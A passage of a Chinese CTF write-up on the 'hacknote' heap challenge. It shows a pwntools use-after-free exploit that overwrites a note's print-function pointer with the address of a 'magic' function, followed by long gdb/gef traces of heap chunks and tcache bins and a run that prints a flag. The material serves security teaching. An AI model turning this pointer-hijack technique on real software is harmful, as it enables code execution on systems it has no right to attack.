class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"aaaa"</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"ddaa"</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>脚本中使用gdb.attach(r)进行调试</p>
+<p>我们可以具体看一下执行的流程，首先先下断点</p>
+<p>magic地址，add_note中两处malloc地址，del_note中两处free地址：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x8048986</span> &lt;magic&gt;:	<span class="number">0x83e58955</span></span><br><span class="line"><span class="number">0x080486ca</span> &lt;+<span class="number">84</span>&gt;:	call   <span class="number">0x80484e0</span> &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line"><span class="number">0x0804875c</span> &lt;+<span class="number">230</span>&gt;:	call   <span class="number">0x80484e0</span> &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line"><span class="number">0x08048893</span> &lt;+<span class="number">143</span>&gt;:	call   <span class="number">0x80484c0</span> &lt;<span class="built_in">free</span>@plt&gt;</span><br><span class="line"><span class="number">0x080488a9</span> &lt;+<span class="number">165</span>&gt;:	call   <span class="number">0x80484c0</span> &lt;<span class="built_in">free</span>@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>两处 malloc 下断点</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x0804875C</span><br><span class="line">Breakpoint 1 at 0x804875c</span><br><span class="line">gef➤  b *0x080486CA</span><br><span class="line">Breakpoint 2 at 0x80486ca</span><br></pre></td></tr></table></figure>
+
+<p><strong>两处 free 下断点</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x08048893</span><br><span class="line">Breakpoint 3 at 0x8048893</span><br><span class="line">gef➤  b *0x080488A9</span><br><span class="line">Breakpoint 4 at 0x80488a9</span><br></pre></td></tr></table></figure>
+
+<p>（以下地址为我本地测试数据，和ctf-wiki有区别，请自行调试）</p>
+<p>然后继续执行程序，可以看出申请 note0 时，所申请到的内存块地址为 0x09fc2160。（eax 存储函数返回值）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x09fc2160  →  0x00000000</span><br><span class="line">$ebx   : 0x0       </span><br><span class="line">$ecx   : 0x21e99   </span><br><span class="line">$edx   : 0x09fc2160  →  0x00000000</span><br><span class="line">$esp   : 0xff8c2850  →  0x00000008</span><br><span class="line">$ebp   : 0xff8c2888  →  0xff8c28a8  →  0x00000000</span><br><span class="line">$esi   : 0xf7ecc000  →  0x001d7d6c (&quot;l&#125;&quot;?)</span><br><span class="line">$edi   : 0x0       </span><br><span class="line">$eip   : 0x080486cf  →  &lt;add_note+89&gt; add esp, 0x10</span><br><span class="line">$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xff8c2850│+0x0000: 0x00000008	 ← $esp</span><br><span class="line">0xff8c2854│+0x0004: 0x00000000</span><br><span class="line">0xff8c2858│+0x0008: 0xf7d26375  →  &lt;strtol+5&gt; add eax, 0x1a5c8b</span><br><span class="line">0xff8c285c│+0x000c: 0xf7d22b50  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xff8c2860│+0x0010: 0xff8c2898  →  0xff8c0a31  →  0x00000000</span><br><span class="line">0xff8c2864│+0x0014: 0x00000000</span><br><span class="line">0xff8c2868│+0x0018: 0x0000000a</span><br><span class="line">0xff8c286c│+0x001c: 0x00000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax</span><br><span class="line">    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al</span><br><span class="line">    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10</span><br><span class="line">    0x80486d2 &lt;add_note+92&gt;    mov    edx, eax</span><br><span class="line">    0x80486d4 &lt;add_note+94&gt;    mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x80486d7 &lt;add_note+97&gt;    mov    DWORD PTR [eax*4+0x804a070], edx</span><br><span class="line">    0x80486de &lt;add_note+104&gt;   mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x80486e1 &lt;add_note+107&gt;   mov    eax, DWORD PTR [eax*4+0x804a070]</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;hacknote&quot;, stopped, reason: SINGLE STEP</span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x80486cf → add_note()</span><br><span class="line">[#1] 0x8048ac5 → main()</span><br><span class="line">[#2] 0xf7d0ce81 → __libc_start_main(main&#x3D;0x8048a38 &lt;main&gt;, argc&#x3D;0x1, argv&#x3D;0xff8c2954, init&#x3D;0x8048b00 &lt;__libc_csu_init&gt;, fini&#x3D;0x8048b60 &lt;__libc_csu_fini&gt;, rtld_fini&#x3D;0xf7f009b0 &lt;_dl_fini&gt;, stack_end&#x3D;0xff8c294c)</span><br><span class="line">[#3] 0x8048581 → _start()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">0x080486cf in add_note ()</span><br><span class="line">gef➤  heap chunk 0x09fc2160</span><br><span class="line">Chunk(addr&#x3D;0x9fc2160, size&#x3D;0x10, flags&#x3D;PREV_INUSE)</span><br><span class="line">Chunk size: 16 (0x10)</span><br><span class="line">Usable size: 12 (0xc)</span><br><span class="line">Previous chunk size: 0 (0x0)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure>
+
+<p><strong>申请 note 0 的 content 的地址为 0x09fc2170</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x09fc2170  →  0x00000000</span><br><span class="line">$ebx   : 0x09fc2160  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp</span><br><span class="line">$ecx   : 0x21e69   </span><br><span class="line">$edx   : 0x09fc2170  →  0x00000000</span><br><span class="line">$esp   : 0xff8c2850  →  0x00000020</span><br><span class="line">$ebp   : 0xff8c2888  →  0xff8c28a8  →  0x00000000</span><br><span class="line">$esi   : 0xf7ecc000  →  0x001d7d6c (&quot;l&#125;&quot;?)</span><br><span class="line">$edi   : 0x0       </span><br><span class="line">$eip   : 0x08048761  →  &lt;add_note+235&gt; add esp, 0x10</span><br><span class="line">$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xff8c2850│+0x0000: 0x00000020	 ← $esp</span><br><span class="line">0xff8c2854│+0x0004: 0xff8c2874  →  0xf70a3233</span><br><span class="line">0xff8c2858│+0x0008: 0x00000008</span><br><span class="line">0xff8c285c│+0x000c: 0xf7d22b50  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xff8c2860│+0x0010: 0xff8c2898  →  0xff8c0a31  →  0x00000000</span><br><span class="line">0xff8c2864│+0x0014: 0x00000000</span><br><span class="line">0xff8c2868│+0x0018: 0x0000000a</span><br><span class="line">0xff8c286c│+0x001c: 0x00000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804</span><br><span class="line">    0x8048757 &lt;add_note+225&gt;   call   0x581173df</span><br><span class="line">    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10</span><br><span class="line">    0x8048764 &lt;add_note+238&gt;   mov    DWORD PTR [ebx+0x4], eax</span><br><span class="line">    0x8048767 &lt;add_note+241&gt;   mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x804876a &lt;add_note+244&gt;   mov    eax, DWORD PTR [eax*4+0x804a070]</span><br><span class="line">    0x8048771 &lt;add_note+251&gt;   mov    eax, DWORD PTR [eax+0x4]</span><br><span class="line">    0x8048774 &lt;add_note+254&gt;   test   eax, eax</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;hacknote&quot;, stopped, reason: SINGLE STEP</span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x8048761 → add_note()</span><br><span class="line">[#1] 0x8048ac5 → main()</span><br><span class="line">[#2] 0xf7d0ce81 → __libc_start_main(main&#x3D;0x8048a38 &lt;main&gt;, argc&#x3D;0x1, argv&#x3D;0xff8c2954, init&#x3D;0x8048b00 &lt;__libc_csu_init&gt;, fini&#x3D;0x8048b60 &lt;__libc_csu_fini&gt;, rtld_fini&#x3D;0xf7f009b0 &lt;_dl_fini&gt;, stack_end&#x3D;0xff8c294c)</span><br><span class="line">[#3] 0x8048581 → _start()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">0x08048761 in add_note ()</span><br><span class="line">gef➤  heap chunk 0x09fc2170</span><br><span class="line">Chunk(addr&#x3D;0x9fc2170, size&#x3D;0x30, flags&#x3D;PREV_INUSE)</span><br><span class="line">Chunk size: 48 (0x30)</span><br><span class="line">Usable size: 44 (0x2c)</span><br><span class="line">Previous chunk size: 0 (0x0)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure>
+
+<p>类似的，我们可以得到 note1 的地址以及其 content 的地址分别为  0x09fc21a0 和 0x09fc21b0。</p>
+<p>同时，我们还可以看到 note0 与 note1 对应的 content 确实是相应的内存块。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  grep aaaa</span><br><span class="line">[+] Searching &#39;aaaa&#39; in memory</span><br><span class="line">[+] In &#39;[heap]&#39;(0x9fc2000-0x9fe4000), permission&#x3D;rw-</span><br><span class="line">  0x9fc2170 - 0x9fc2174  →   &quot;aaaa&quot; </span><br><span class="line">gef➤  grep ddaa</span><br><span class="line">[+] Searching &#39;ddaa&#39; in memory</span><br><span class="line">[+] In &#39;[heap]&#39;(0x9fc2000-0x9fe4000), permission&#x3D;rw-</span><br><span class="line">  0x9fc21b0 - 0x9fc21b4  →   &quot;ddaa&quot;</span><br></pre></td></tr></table></figure>
+
+<p>下面就是 free 的过程了。我们可以依次发现首先，note0 的 content 被 free</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">→  0x8048893 &lt;del_note+143&gt;   call   0x80484c0 &lt;free@plt&gt;</span><br><span class="line">   ↳   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018</span><br><span class="line">       0x80484c6 &lt;free@plt+6&gt;     push   0x18</span><br><span class="line">       0x80484cb &lt;free@plt+11&gt;    jmp    0x8048480</span><br><span class="line">       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c</span><br><span class="line">       0x80484d6 &lt;__stack_chk_fail@plt+6&gt; push   0x20</span><br><span class="line">       0x80484db &lt;__stack_chk_fail@plt+11&gt; jmp    0x8048480</span><br><span class="line">─────────────────────────────────────────────────────── arguments (guessed) ────</span><br><span class="line">free@plt (</span><br><span class="line">   [sp + 0x0] &#x3D; 0x09fc2170 → &quot;aaaa&quot;,</span><br><span class="line">   [sp + 0x4] &#x3D; 0xff8c2878 → 0xf7ec0a30 → 0x00200e46</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>然后是 note0 本身</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> →  0x80488a9 &lt;del_note+165&gt;   call   0x80484c0 &lt;free@plt&gt;</span><br><span class="line">   ↳   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018</span><br><span class="line">       0x80484c6 &lt;free@plt+6&gt;     push   0x18</span><br><span class="line">       0x80484cb &lt;free@plt+11&gt;    jmp    0x8048480</span><br><span class="line">       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c</span><br><span class="line">       0x80484d6 &lt;__stack_chk_fail@plt+6&gt; push   0x20</span><br><span class="line">       0x80484db &lt;__stack_chk_fail@plt+11&gt; jmp    0x8048480</span><br><span class="line">─────────────────────────────────────────────────────── arguments (guessed) ────</span><br><span class="line">free@plt (</span><br><span class="line">   [sp + 0x0] &#x3D; 0x09fc2160 → 0x0804865b → &lt;print_note_content+0&gt; push ebp,</span><br><span class="line">   [sp + 0x4] &#x3D; 0xff8c2878 → 0xf7ec0a30 → 0x00200e46</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>当 delete 结束后，我们观看一下 bins，可以发现，确实其被存放在对应的 fast bin 中，(我这里因为测试环境版本问题，是Tcachebins，但可以看到两个地址是对的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bins </span><br><span class="line">─────────────────────── Tcachebins for arena 0xf7ecc7a0 ───────────────────────</span><br><span class="line">Tcachebins[idx&#x3D;2, size&#x3D;0x18] count&#x3D;1  ←  Chunk(addr&#x3D;0x9fc2160, size&#x3D;0x10, flags&#x3D;PREV_INUSE) </span><br><span class="line">Tcachebins[idx&#x3D;4, size&#x3D;0x28] count&#x3D;0  ←  Chunk(addr&#x3D;0x9fc2170, size&#x3D;0x30, flags&#x3D;PREV_INUSE) </span><br><span class="line">──────────────────────── Fastbins for arena 0xf7ecc7a0 ────────────────────────</span><br><span class="line">Fastbins[idx&#x3D;0, size&#x3D;0x8] 0x00</span><br><span class="line">Fastbins[idx&#x3D;1, size&#x3D;0x10] 0x00</span><br><span class="line">Fastbins[idx&#x3D;2, size&#x3D;0x18] 0x00</span><br><span class="line">Fastbins[idx&#x3D;3, size&#x3D;0x20] 0x00</span><br><span class="line">Fastbins[idx&#x3D;4, size&#x3D;0x28] 0x00</span><br><span class="line">Fastbins[idx&#x3D;5, size&#x3D;0x30] 0x00</span><br><span class="line">Fastbins[idx&#x3D;6, size&#x3D;0x38] 0x00</span><br></pre></td></tr></table></figure>
+
+<p>当我们将 note1 也全部删除完毕后，再次观看 bins。可以看出，后删除的 chunk 块确实处于表头。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bins</span><br><span class="line">─────────────────────── Tcachebins for arena 0xf7f217a0 ───────────────────────</span><br><span class="line">Tcachebins[idx&#x3D;2, size&#x3D;0x18] count&#x3D;2  ←  Chunk(addr&#x3D;0x9cec1a0, size&#x3D;0x10, flags&#x3D;PREV_INUSE)  ←  Chunk(addr&#x3D;0x9cec160, size&#x3D;0x10, flags&#x3D;PREV_INUSE) </span><br><span class="line">Tcachebins[idx&#x3D;4, size&#x3D;0x28] count&#x3D;0  ←  Chunk(addr&#x3D;0x9cec1b0, size&#x3D;0x30, flags&#x3D;PREV_INUSE)  ←  Chunk(addr&#x3D;0x9cec170, size&#x3D;0x30, flags&#x3D;PREV_INUSE) </span><br><span class="line">──────────────────────── Fastbins for arena 0xf7f217a0 ────────────────────────</span><br><span class="line">Fastbins[idx&#x3D;0, size&#x3D;0x8] 0x00</span><br><span class="line">Fastbins[idx&#x3D;1, size&#x3D;0x10] 0x00</span><br><span class="line">Fastbins[idx&#x3D;2, size&#x3D;0x18] 0x00</span><br><span class="line">Fastbins[idx&#x3D;3, size&#x3D;0x20] 0x00</span><br><span class="line">Fastbins[idx&#x3D;4, size&#x3D;0x28] 0x00</span><br><span class="line">Fastbins[idx&#x3D;5, size&#x3D;0x30] 0x00</span><br><span class="line">Fastbins[idx&#x3D;6, size&#x3D;0x38] 0x00</span><br></pre></td></tr></table></figure>
+
+<p>那么，此时即将要申请 note2，我们可以看下 note2 都申请到了什么内存块，如下</p>
+<p><strong>申请 note2 对应的内存块为 0x09cec1a0，其实就是 note1 对应的内存地址。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x09cec1a0  →  0x09cec160  →  0x00000000</span><br><span class="line">$ebx   : 0x0       </span><br><span class="line">$ecx   : 0x09cec010  →  0x00020001</span><br><span class="line">$edx   : 0x09cec1a0  →  0x09cec160  →  0x00000000</span><br><span class="line">$esp   : 0xffca8fb0  →  0x00000008</span><br><span class="line">$ebp   : 0xffca8fe8  →  0xffca9008  →  0x00000000</span><br><span class="line">$esi   : 0xf7f21000  →  0x001d7d6c (&quot;l&#125;&quot;?)</span><br><span class="line">$edi   : 0x0       </span><br><span class="line">$eip   : 0x080486cf  →  &lt;add_note+89&gt; add esp, 0x10</span><br><span class="line">$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffca8fb0│+0x0000: 0x00000008	 ← $esp</span><br><span class="line">0xffca8fb4│+0x0004: 0x00000004</span><br><span class="line">0xffca8fb8│+0x0008: 0xf7d7b375  →  &lt;strtol+5&gt; add eax, 0x1a5c8b</span><br><span class="line">0xffca8fbc│+0x000c: 0xf7d77b50  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xffca8fc0│+0x0010: 0xffca8ff8  →  0xffca0a31  →  0x00000000</span><br><span class="line">0xffca8fc4│+0x0014: 0x00000000</span><br><span class="line">0xffca8fc8│+0x0018: 0x0000000a</span><br><span class="line">0xffca8fcc│+0x001c: 0x00000002</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax</span><br><span class="line">    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al</span><br><span class="line">    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10</span><br></pre></td></tr></table></figure>
+
+<p><strong>申请 note2 的 content 的内存地址为 0x804b008，就是 note0 对应的地址，即此时我们向 note2 的 content 写内容，就会将 note0 的 put 字段覆盖。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x09cec160  →  0x00000000</span><br><span class="line">$ebx   : 0x09cec1a0  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp</span><br><span class="line">$ecx   : 0x09cec010  →  0x00020000</span><br><span class="line">$edx   : 0x09cec160  →  0x00000000</span><br><span class="line">$esp   : 0xffca8fb0  →  0x00000008</span><br><span class="line">$ebp   : 0xffca8fe8  →  0xffca9008  →  0x00000000</span><br><span class="line">$esi   : 0xf7f21000  →  0x001d7d6c (&quot;l&#125;&quot;?)</span><br><span class="line">$edi   : 0x0       </span><br><span class="line">$eip   : 0x08048761  →  &lt;add_note+235&gt; add esp, 0x10</span><br><span class="line">$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffca8fb0│+0x0000: 0x00000008	 ← $esp</span><br><span class="line">0xffca8fb4│+0x0004: 0xffca8fd4  →  0x00000a38 (&quot;8&quot;?)</span><br><span class="line">0xffca8fb8│+0x0008: 0x00000008</span><br><span class="line">0xffca8fbc│+0x000c: 0xf7d77b50  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xffca8fc0│+0x0010: 0xffca8ff8  →  0xffca0a31  →  0x00000000</span><br><span class="line">0xffca8fc4│+0x0014: 0x00000000</span><br><span class="line">0xffca8fc8│+0x0018: 0x0000000a</span><br><span class="line">0xffca8fcc│+0x001c: 0x00000002</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804</span><br><span class="line">    0x8048757 &lt;add_note+225&gt;   call   0x581173df</span><br><span class="line">    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10</span><br></pre></td></tr></table></figure>
+
+<p>我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的 put 指针已经被置为 NULL 了，这是由 fastbin 的 free 机制决定的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;2wx 0x09cec160</span><br><span class="line">0x9cec160:	0x00000000	0x09cec170</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
+
+<p>覆盖后，具体的值如下（这里其实我测试的时候跳多了，直接结束了，重新跑的时候地址变了，所以0x0846210a这个地方是错的，但前面被修改为magic地址是可以确定的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;2wx 0x09cec160</span><br><span class="line">0x09cec160:	0x08048986	0x0846210a</span><br><span class="line">gef➤  x&#x2F;i 0x08048986</span><br><span class="line">   0x8048986 &lt;magic&gt;:	push   ebp</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，确实已经被覆盖为我们所想要的 magic 函数了。</p>
+<p>最后执行的效果如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ python exp.py           </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./hacknote'</span>: pid 20575</span><br><span class="line">[*] running <span class="keyword">in</span> new terminal: /usr/bin/gdb -q  <span class="string">"./hacknote"</span> 20575 -x <span class="string">"/tmp/pwnHjxz2s.gdb"</span></span><br><span class="line">[+] Waiting <span class="keyword">for</span> debugger: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">THIS_IS_A_FLAG</span><br><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :$</span><br></pre></td></tr></table></figure>
+
+<p>同时，我们还可以借助 gef 的 heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下</p>
